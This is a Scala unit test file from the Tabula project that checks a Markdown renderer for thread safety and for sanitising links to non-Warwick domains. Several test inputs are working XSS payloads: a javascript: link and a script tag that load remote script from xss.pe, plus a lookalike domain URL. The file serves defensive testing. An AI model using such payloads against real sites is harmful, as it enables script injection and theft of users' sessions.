package uk.ac.warwick.tabula.web.views

import java.util.concurrent.TimeUnit

import uk.ac.warwick.tabula.TestBase
import uk.ac.warwick.tabula.helpers.ExecutionContexts.global

import scala.concurrent._
import scala.concurrent.duration.Duration
import scala.util.{Failure, Success}

class MarkdownRendererTest extends TestBase {

	val renderer = new MarkdownRendererImpl {}

	// Trying to reproduce ClassCast error.
	@Test def TAB_2169() {
		val input =
			"""This message confirms that you made a submission for the assignment 'Assessment 2' for EC204 Economics 2.
				|
				|- Submission date: ${submissionDate}
				|- Submission ID: ${submission.id}
				|- University ID: ${user.warwickId}
				|
				|Uploaded attachments:
				|
				|- Whatever
				|- Who cares
			""".stripMargin
		renderer.renderMarkdown(input) should (include("<li>Whatever</li>") and include("<li>University ID: ${user.warwickId}</li>"))

		// Check multithreadedness by rendering a lot at once.
		val results = (1 to 10).map(
			i => Future {
				renderer.renderMarkdown(input + i)
			}
		)

		for (result <- results) {
			// Blocking wait
			Await.ready(result, Duration(1, TimeUnit.SECONDS))
			result.value.get match {
				case Success(v) => //
				case Failure(e) => fail(e)
			}
		}
	}

	@Test
	def sanitise(): Unit = {
		val input1 =
			"""
				|Unable to load Tabula. Click to [try again](javascript:document.body.appendChild(document.createElement('script')).setAttribute('src','//xss.pe/t'))
			""".stripMargin
		val output1: String = renderer.renderMarkdown(input1)

		output1.contains("javascript:") should be(false)
		output1.contains("<a") should be(false)
		output1.contains("document.") should be(false)
		output1.contains("xss.pe") should be(false)

		val input2 =
			"""
				|*foo*ï¼œ<script src=//xss.pe/t>**foo**</script>
			""".stripMargin
		val output2: String = renderer.renderMarkdown(input2)

		output2.contains("<script") should be(false)
		output2.contains("/script>") should be(false)
		output2.contains("xss.pe") should be(false)


		// fine within *.warwick.ac.uk domain
		val input3 =
			"""
				|thisisfine [magiclink](https://www.warwick.ac.uk "isthisfine").
			""".stripMargin

		val output3 = renderer.renderMarkdown(input3)

		output3.trim should be(
			"""
				|<p>thisisfine <a href="https://www.warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
			""".stripMargin.trim)


		// fine within *.warwick.ac.uk domain
		val input4 =
			"""
				|thisisfine [magiclink](https://shylock.warwick.ac.uk "isthisfine").
			""".stripMargin

		val output4 = renderer.renderMarkdown(input4)

		output4.trim should be(
			"""
				|<p>thisisfine <a href="https://shylock.warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
			""".stripMargin.trim)


		// NOT fine with non warwick domain
		val input5 =
			"""
				|thisIsNotFine [darkMagicLink](https://shylock.adam.ac.uk "notFineNotFine").
			""".stripMargin

		val output5 = renderer.renderMarkdown(input5)

		output5.trim should be(
			"""
				|<p>thisIsNotFine <a title="notFineNotFine">darkMagicLink</a>.</p>
			""".stripMargin.trim)

		// fine within warwick.ac.uk
		val input6 =
			"""
				|thisisfine [magiclink](https://warwick.ac.uk "isthisfine").
			""".stripMargin

		val output6 = renderer.renderMarkdown(input6)

		output6.trim should be(
			"""
				|<p>thisisfine <a href="https://warwick.ac.uk" title="isthisfine">magiclink</a>.</p>
			""".stripMargin.trim)

		// not fine
		val input7 =
			"""
				|notFine [darkMagicLink](https://xss.pe/evil.warwick.ac.uk "notFineNotFine").
			""".stripMargin

		val output7 = renderer.renderMarkdown(input7)

		output7.trim should be(
			"""
				|<p>notFine <a title="notFineNotFine">darkMagicLink</a>.</p>
			""".stripMargin.trim)


	}


}
